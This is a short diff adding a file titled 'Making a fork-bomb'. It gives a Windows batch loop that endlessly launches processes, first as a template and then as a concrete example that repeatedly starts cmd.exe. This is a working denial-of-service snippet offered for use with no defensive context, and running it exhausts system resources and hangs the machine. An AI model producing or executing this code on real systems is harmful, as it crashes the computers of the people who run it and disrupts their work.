@@ -1,0 +1,12 @@
+Making a fork-bomb:
+
+:loop
+Start (Process ID of you choice)
+goto loop
+
+EMAPLE:
+
+
+:loop
+start cmd.exe
+goto loop
